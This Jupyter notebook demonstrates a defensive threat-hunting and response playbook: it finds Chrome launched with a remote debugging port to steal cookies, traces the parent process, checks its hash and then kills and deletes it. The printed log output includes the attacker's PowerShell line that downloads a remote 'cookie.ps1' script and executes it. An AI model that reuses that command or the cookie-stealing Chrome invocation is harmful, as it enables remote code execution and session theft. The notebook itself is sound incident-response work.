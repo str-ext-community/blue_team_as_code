{
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "<h1>STR SOAR Demo Playbook<span class=\"tocSkip\"></span></h1>\n",
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\">\n",
    "    <ul class=\"toc-item\">\n",
    "        <li>\n",
    "            <span><a href=\"#Notebook-Title\" data-toc-modified-id=\"Notebook-Title-1\">STR SOAR Demo Playbook</a></span>\n",
    "            <ul class=\"toc-item\">\n",
    "                <li>\n",
    "                    <span><a href=\"#create-client\" data-toc-modified-id=\"create-client-1.2\">Create Securonix Client</a></span>\n",
    "                </li>\n",
    "                <li>\n",
    "                    <span><a href=\"#init-soar\" data-toc-modified-id=\"create-client-1.2\">Initialize SX SOAR microservice connectors</a></span>\n",
    "                </li>\n",
    "                <li>\n",
    "                    <span><a href=\"#init-omconverter\" data-toc-modified-id=\"create-client-1.2\">Convert OMEGA rule to spotter query</a></span>\n",
    "                </li>\n",
    "                <li>\n",
    "                    <span><a href=\"#run-hunt\" data-toc-modified-id=\"create-client-1.2\">Hunt with query</a></span>\n",
    "                </li>\n",
    "                <li>\n",
    "                    <span><a href=\"#show-process-tree\" data-toc-modified-id=\"create-client-1.2\">Build Process Tree Graph  For sessionid's </a></span>\n",
    "                </li>\n",
    "                 <li>\n",
    "                    <span><a href=\"#ioc-hunting\" data-toc-modified-id=\"IOC-Hunting-1.5\">SX SOAR</a></span>\n",
    "                     <ul class=\"toc-item\">\n",
    "                        <li>\n",
    "                            <span><a href=\"#soar-gethash\" data-toc-modified-id=\"create-client-1.2\">Retrieve hash from device by path</a></span>\n",
    "                        </li>\n",
    "                        <li>\n",
    "                            <span><a href=\"#soar-vt-status\" data-toc-modified-id=\"create-client-1.2\">Check hash at VT</a></span>\n",
    "                        </li>\n",
    "                        <li>\n",
    "                            <span><a href=\"#soar-cs-deletefile\" data-toc-modified-id=\"create-client-1.2\">Delete file from device using SX SOAR Microservice</a></span>\n",
    "                        </li>\n",
    "                     </ul>\n",
    "            </ul>\n",
    "        </li>\n",
    "    </ul>\n",
    "</div>"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='init'></a>\n",
    "## Library initialization"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "source": [
    "#!python3 -m pip install -r requirements.txt "
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "source": [
    "from vizr.STRVizr import STRVizr\n",
    "import pandas as pd\n",
    "import logging\n",
    "from IPython.display import HTML\n",
    "logging.basicConfig(level=logging.ERROR)\n",
    "\n",
    "\n",
    "import sys,os\n",
    "sys.path += [\n",
    "                os.path.abspath('../str-omega'),\n",
    "]\n",
    "from omega.converter import STROmegaConverter\n",
    "\n",
    "pd.set_option('display.max_colwidth', -1)"
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='create-client'></a>\n",
    "## Create Securonix Client"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "source": [
    "client = STRVizr(host=\"https://****.securonix.net/Snypr\", token=\"****\", verify=False)"
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='init-soar'></a>\n",
    "## Initialize SX SOAR microservice connectors"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "source": [
    "from vizr.soar.crowdstrike import Crowdstrike\n",
    "from vizr.soar.virustotal import VirusTotal\n",
    "\n",
    "cs = Crowdstrike({\n",
    "        \"microservice_url\": \"...redacted\",\n",
    "        \"client_id\": \"...redacted\",\n",
    "        \"client_secret\": \"...redacted\"\n",
    "})\n",
    "\n",
    "vt = VirusTotal({\n",
    "      \"microservice_url\": \"...redacted\",\n",
    "      \"apikey\": \"...redacted\",     \n",
    "      \"server_url\": \"...redacted\"  \n",
    "})"
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='init-omconverter'></a>\n",
    "## Convert OMEGA rule located at /STR-UPS/i1-pass-the-cookie/stratum1 with id DEMO4 to spotter query"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "source": [
    "omega = STROmegaConverter(\n",
    "    omega_rules_home =  \"./omega\", \n",
    "    mapping= \"./omega/mapping.yml\"\n",
    ")\n",
    "\n",
    "spotter_query = omega.convertByUUID(\n",
    "    uuid = \"DEMO4\"\n",
    ")\n",
    "print(spotter_query)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "(rg_functionality = \"Endpoint Management Systems\" AND baseeventid = \"1\" AND (destinationprocessname ENDS WITH \"chrome.exe\" AND (resourcecustomfield1 CONTAINS \"--user-data-dir\" OR resourcecustomfield1 CONTAINS \"--remote-debugging-port\")) AND (sourceprocessname NOT ENDS WITH \"chrome.exe\"))\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='set-timerange'></a>\n",
    "### Set time range for hunting"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "source": [
    "#format %m/%d/%Y %H:%M:%S\n",
    "time_from = \"04/05/2021 11:31:00\"\n",
    "time_to   = \"04/05/2021 23:59:59\"\n",
    "timezone = \"EST5EDT\""
   ],
   "outputs": [],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='run-hunt'></a>\n",
    "## Hunt with query"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "source": [
    "spotter_query = '''\n",
    "baseeventid = \"1\" AND (destinationprocessname ENDS WITH \"chrome.exe\" AND (resourcecustomfield1 CONTAINS \"--user-data-dir\" OR resourcecustomfield1 CONTAINS \"--remote-debugging-port\")) AND sourceprocessname NOT ENDS WITH \"chrome.exe\"\n",
    "'''\n",
    "\n",
    "query = '''\n",
    "index=activity and \n",
    "%s\n",
    "''' % (spotter_query)\n",
    "\n",
    "df = await client.search(query, time_from=time_from, time_to=time_to, max=100)\n",
    "df"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stderr",
     "text": [
      "processed: 1 requests: 100%|██████████| 1/1 [00:00<00:00,  1.48it/s]\n"
     ]
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>_indexed_at_tdt</th>\n",
       "      <th>_version_</th>\n",
       "      <th>accountname</th>\n",
       "      <th>accountresourcekey</th>\n",
       "      <th>agentfilename</th>\n",
       "      <th>baseeventid</th>\n",
       "      <th>categorizedtime</th>\n",
       "      <th>categoryseverity</th>\n",
       "      <th>collectionmethod</th>\n",
       "      <th>collectiontimestamp</th>\n",
       "      <th>...</th>\n",
       "      <th>timeline</th>\n",
       "      <th>timeline_by_hour</th>\n",
       "      <th>timeline_by_minute</th>\n",
       "      <th>timeline_by_month</th>\n",
       "      <th>timeline_by_week</th>\n",
       "      <th>transactionstring1</th>\n",
       "      <th>transactionstring2</th>\n",
       "      <th>userid</th>\n",
       "      <th>week</th>\n",
       "      <th>year</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Mon Apr 05 16:38:00 UTC 2021</td>\n",
       "      <td>1696219194292436992</td>\n",
       "      <td>DEMO-SYSMON</td>\n",
       "      <td>DEMO-SYSMON~demo-sysmon~demo-sysmon~1~-1</td>\n",
       "      <td>1_dest2021040516</td>\n",
       "      <td>1</td>\n",
       "      <td>Evening</td>\n",
       "      <td>0</td>\n",
       "      <td>file</td>\n",
       "      <td>1617640590014</td>\n",
       "      <td>...</td>\n",
       "      <td>1617598800000</td>\n",
       "      <td>1617638400000</td>\n",
       "      <td>1617640500000</td>\n",
       "      <td>1617253200000</td>\n",
       "      <td>1617512400000</td>\n",
       "      <td>Process Monitoring System</td>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>-1</td>\n",
       "      <td>15</td>\n",
       "      <td>2021</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1 rows × 71 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                _indexed_at_tdt            _version_  accountname  \\\n",
       "0  Mon Apr 05 16:38:00 UTC 2021  1696219194292436992  DEMO-SYSMON   \n",
       "\n",
       "                         accountresourcekey     agentfilename baseeventid  \\\n",
       "0  DEMO-SYSMON~demo-sysmon~demo-sysmon~1~-1  1_dest2021040516  1            \n",
       "\n",
       "  categorizedtime categoryseverity collectionmethod collectiontimestamp  ...  \\\n",
       "0  Evening         0                file             1617640590014       ...   \n",
       "\n",
       "        timeline timeline_by_hour timeline_by_minute timeline_by_month  \\\n",
       "0  1617598800000  1617638400000    1617640500000      1617253200000      \n",
       "\n",
       "  timeline_by_week         transactionstring1        transactionstring2  \\\n",
       "0  1617512400000    Process Monitoring System  Microsoft-Windows-Sysmon   \n",
       "\n",
       "  userid week  year  \n",
       "0  -1     15   2021  \n",
       "\n",
       "[1 rows x 71 columns]"
      ]
     },
     "metadata": {},
     "execution_count": 6
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "source": [
    "df.iloc[0]"
   ],
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "_indexed_at_tdt           Mon Apr 05 16:38:00 UTC 2021                                                                                                                                                                                                                                                    \n",
       "_version_                 1696219194292436992                                                                                                                                                                                                                                                             \n",
       "accountname               DEMO-SYSMON                                                                                                                                                                                                                                                                     \n",
       "accountresourcekey        DEMO-SYSMON~demo-sysmon~demo-sysmon~1~-1                                                                                                                                                                                                                                        \n",
       "agentfilename             1_dest2021040516                                                                                                                                                                                                                                                                \n",
       "baseeventid               1                                                                                                                                                                                                                                                                               \n",
       "categorizedtime           Evening                                                                                                                                                                                                                                                                         \n",
       "categoryseverity          0                                                                                                                                                                                                                                                                               \n",
       "collectionmethod          file                                                                                                                                                                                                                                                                            \n",
       "collectiontimestamp       1617640590014                                                                                                                                                                                                                                                                   \n",
       "customfield2              1617640590035                                                                                                                                                                                                                                                                   \n",
       "customfield3              1_dest2021040516                                                                                                                                                                                                                                                                \n",
       "customstring1             Medium                                                                                                                                                                                                                                                                          \n",
       "datetime                  1617640577000                                                                                                                                                                                                                                                                   \n",
       "dayofmonth                5                                                                                                                                                                                                                                                                               \n",
       "dayofweek                 2                                                                                                                                                                                                                                                                               \n",
       "dayofyear                 95                                                                                                                                                                                                                                                                              \n",
       "destinationprocessname    chrome.exe                                                                                                                                                                                                                                                                      \n",
       "deviceaction              ProcessCreate                                                                                                                                                                                                                                                                   \n",
       "devicecustomstring3       Google LLC                                                                                                                                                                                                                                                                      \n",
       "devicecustomstring4       0xCF86C                                                                                                                                                                                                                                                                         \n",
       "devicecustomstring5       89.0.4389.114                                                                                                                                                                                                                                                                   \n",
       "devicecustomstring6       a3611358-3c10-606b-6cf8-0c0000000000                                                                                                                                                                                                                                            \n",
       "deviceexternalid          a3611358-3c81-606b-e900-000000001000                                                                                                                                                                                                                                            \n",
       "deviceprocessid           4104                                                                                                                                                                                                                                                                            \n",
       "deviceseverity            Information                                                                                                                                                                                                                                                                     \n",
       "eventid                   16e6667e-9b75-43e2-9cf8-5618a953f7f6                                                                                                                                                                                                                                            \n",
       "filehash                  0C6A37537BE50D03C4C7D7FB1D64E881A2C363185712A1C0E1E2C86F2FAF3F19                                                                                                                                                                                                                \n",
       "filepath                  C:\\Program Files\\Google\\Chrome\\Application\\                                                                                                                                                                                                                                     \n",
       "flowsiemid                a3611358-3c7c-606b-e800-000000001000                                                                                                                                                                                                                                            \n",
       "                                          ...                                                                                                                                                                                                                                                             \n",
       "receivedtime              1617640620679                                                                                                                                                                                                                                                                   \n",
       "resourcecustomfield1      \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://google.com --user-data-dir=\"C:\\Users\\str\\AppData\\Local\\Google\\Chrome\\User Data\" --remote-debugging-port=9142                                                                                                \n",
       "resourcecustomfield2      p.exe  Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('http://143.198.121.254/ArWsFIfR/cookie.ps1'))\n",
       "resourcecustomfield3      Google Chrome                                                                                                                                                                                                                                                                   \n",
       "resourcecustomfield4      Google Chrome                                                                                                                                                                                                                                                                   \n",
       "resourcecustomfield7      C:\\temp\\p.exe                                                                                                                                                                                                                                                                   \n",
       "resourcecustomfield8      C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe                                                                                                                                                                                                                           \n",
       "resourcegroupid           1                                                                                                                                                                                                                                                                               \n",
       "resourcegroupname         demo-sysmon                                                                                                                                                                                                                                                                     \n",
       "resourcename              demo-sysmon                                                                                                                                                                                                                                                                     \n",
       "rg_functionality          DemoFunc                                                                                                                                                                                                                                                                        \n",
       "rg_resourcetypeid         4                                                                                                                                                                                                                                                                               \n",
       "rg_timezoneoffset         UTC                                                                                                                                                                                                                                                                             \n",
       "rg_vendor                 DemoVendor                                                                                                                                                                                                                                                                      \n",
       "sourcehostname            win10-laptop004                                                                                                                                                                                                                                                                 \n",
       "sourceprocessid           1196                                                                                                                                                                                                                                                                            \n",
       "sourceprocessname         p.exe                                                                                                                                                                                                                                                                           \n",
       "sourceusername            WIN10-LAPTOP004\\str                                                                                                                                                                                                                                                         \n",
       "tenantid                  1                                                                                                                                                                                                                                                                               \n",
       "tenantname                a1t1str1                                                                                                                                                                                                                                                                        \n",
       "timeline                  1617598800000                                                                                                                                                                                                                                                                   \n",
       "timeline_by_hour          1617638400000                                                                                                                                                                                                                                                                   \n",
       "timeline_by_minute        1617640500000                                                                                                                                                                                                                                                                   \n",
       "timeline_by_month         1617253200000                                                                                                                                                                                                                                                                   \n",
       "timeline_by_week          1617512400000                                                                                                                                                                                                                                                                   \n",
       "transactionstring1        Process Monitoring System                                                                                                                                                                                                                                                       \n",
       "transactionstring2        Microsoft-Windows-Sysmon                                                                                                                                                                                                                                                        \n",
       "userid                    -1                                                                                                                                                                                                                                                                              \n",
       "week                      15                                                                                                                                                                                                                                                                              \n",
       "year                      2021                                                                                                                                                                                                                                                                            \n",
       "Name: 0, Length: 71, dtype: object"
      ]
     },
     "metadata": {},
     "execution_count": 7
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Who spawn chrome  with debugger port?"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "source": [
    "print(\"Parent Image: %s\" % df.iloc[0][\"resourcecustomfield7\"])\n",
    "print(\"Parent ID: %s\" % df.iloc[0][\"sourceprocessid\"])"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Parent Image: C:\\temp\\p.exe\n",
      "Parent ID: 1196\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Parent CommandLine is:"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "source": [
    "print(\"Parent CommandLine: %s\" % df.iloc[0][\"resourcecustomfield2\"])"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Parent CommandLine: p.exe  Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('http://143.198.121.254/ArWsFIfR/cookie.ps1'))\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Device is:"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "source": [
    "device = df.iloc[0][\"sourceusername\"].split(\"\\\\\")[0]\n",
    "print(\"device: %s\" % device)\n"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "device: WIN10-LAPTOP004\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Logon session is:"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "source": [
    "logon_session = df.iloc[0][\"devicecustomstring4\"]\n",
    "print(\"Logon session: %s\" % logon_session)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Logon session: 0xCF86C\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='show-process-tree'></a>\n",
    "## Build Process Tree Graph  For sessionid's "
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "source": [
    "from pyvis import network as net\n",
    "import networkx as nx\n",
    "\n",
    "query = '''\n",
    "index=activity and \n",
    "baseventid=1 AND devicecustomstring4=%s\n",
    "''' % (logon_session)\n",
    "\n",
    "# print(query)\n",
    "# \n",
    "process_tree_nodes = await client.search(query, time_from=time_from, time_to=time_to, max=100)\n",
    "process_tree_nodes['UNIXTIME'] = pd.to_datetime(process_tree_nodes['datetime'], unit='ms')\\\n",
    "    .dt.tz_localize('UTC' )\\\n",
    "    .dt.tz_convert(timezone)\n",
    "\n",
    "    \n",
    "G=nx.DiGraph()\n",
    "\n",
    "def create_graph(row):\n",
    "    #parent meta\n",
    "    parent_meta  = \"\\\n",
    "        Date: {}<br/>\\\n",
    "        LogonID: {} {}<br/>\\\n",
    "        Path: {}{}<br/>\\\n",
    "        PID: {}<br/>\\\n",
    "        CommandLine: {}<br/>\\\n",
    "        Child: {}</br>\\\n",
    "        GUID: {}</br>\\\n",
    "        Parent GUID: {}\\\n",
    "        \".format(\n",
    "        row['UNIXTIME'],\n",
    "        row['sourceusername'], \n",
    "        row['devicecustomstring4'], \n",
    "        #row['destinationusername'],\n",
    "        row['oldfilepath'],\n",
    "        row['sourceprocessname'],\n",
    "        row['sourceprocessid'],\n",
    "        row['resourcecustomfield2'],\n",
    "        row['destinationprocessname'],\n",
    "        row['deviceexternalid'], #guid\n",
    "        row['flowsiemid'], #parent guid        \n",
    "    )\n",
    "    G.add_node(row['flowsiemid'], color='#30a1a5',size=20, title=parent_meta, label=row['sourceprocessname'],)\n",
    "    \n",
    "    #process meta\n",
    "    process_meta  = \"\\\n",
    "        Date: {}<br/>\\\n",
    "        LogonID: {} {}<br/>\\\n",
    "        Path: {}{}<br/>\\\n",
    "        PID: {}<br/>\\\n",
    "        CommandLine: {}<br/>\\\n",
    "        Parent:{}</br>\\\n",
    "        GUID: {}</br>\\\n",
    "        Parent GUID: {}\\\n",
    "        \".format(\n",
    "        row['UNIXTIME'],\n",
    "        row['sourceusername'], \n",
    "        row['devicecustomstring4'], \n",
    "        #row['destinationusername'],\n",
    "        row['filepath'],\n",
    "        row['destinationprocessname'],\n",
    "        row['deviceprocessid'],\n",
    "        row['resourcecustomfield1'],\n",
    "        row['sourceprocessname'],\n",
    "        row['deviceexternalid'], #guid\n",
    "        row['flowsiemid'], #parent guid        \n",
    "        \n",
    "    )\n",
    "    G.add_node(row['deviceexternalid'], color='#30a1a5',size=20, title=process_meta, label=row['destinationprocessname'])\n",
    "    G.add_edge(row['flowsiemid'], row['deviceexternalid'], weight=10)\n",
    "    return 1\n",
    "\n",
    "process_tree_nodes['OK'] = process_tree_nodes.apply(lambda row: create_graph(row), axis=1)\n",
    "\n",
    "nt = net.Network(\"400px\", \"1500px\", heading=\"Process Tree Graph\", notebook=True, directed=True)\n",
    "nt.from_nx(G)\n",
    "nt.show(\"process_tree_graph.html\")"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stderr",
     "text": [
      "processed: 1 requests: 100%|██████████| 1/1 [00:01<00:00,  1.24s/it]\n"
     ]
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"1500px\"\n",
       "            height=\"400px\"\n",
       "            src=\"process_tree_graph.html\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7fb13973c3a0>"
      ]
     },
     "metadata": {},
     "execution_count": 12
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='soar-gethash'></a>\n",
    "## Let's get hash of this suspicious file \"C:\\\\temp\\\\p.exe\" using SX SOAR microservice "
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "source": [
    "filepath  = \"C:\\\\temp\\\\p.exe\"\n",
    "results  = cs.returnFileHashByFilePath(filepath, device)\n",
    "filehash = results[\"SHA256\"]\n",
    "print(\"sha256 hash: %s\" % filehash)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "sha256 hash: DBD961168786CF454201CCBEF2C7AA7FA72A62A9D353032393CB31C2F8B37D60\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='soar-vt-status'></a>\n",
    "## Check this hash at VT using SX SOAR microservice"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "source": [
    "report = vt.retrieveScanFileReport(filehash)\n",
    "print(\"VT Status: %s\" % report[filehash]['status'])\n"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "VT Status: 1/58\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='soar-cs-terminate'></a>\n",
    "## Terminate process file from device using SX SOAR Microservice"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "source": [
    "results  = cs.terminateRunningProcess(\"p.exe\", device)\n",
    "results"
   ],
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "{'Termination Status by ProcessID': {'7512': 'Process killed successfully'},\n",
       " 'Hostname': 'WIN10-LAPTOP004',\n",
       " 'Process': 'p.exe'}"
      ]
     },
     "metadata": {},
     "execution_count": 15
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "<a id='soar-cs-deletefile'></a>\n",
    "## Delete file from device using SX SOAR Microservice"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "source": [
    "results  = cs.deleteFileByFileName(\"p.exe\", device)\n",
    "results"
   ],
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "{'Status': 'Deleted'}"
      ]
     },
     "metadata": {},
     "execution_count": 16
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "source": [],
   "outputs": [],
   "metadata": {}
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}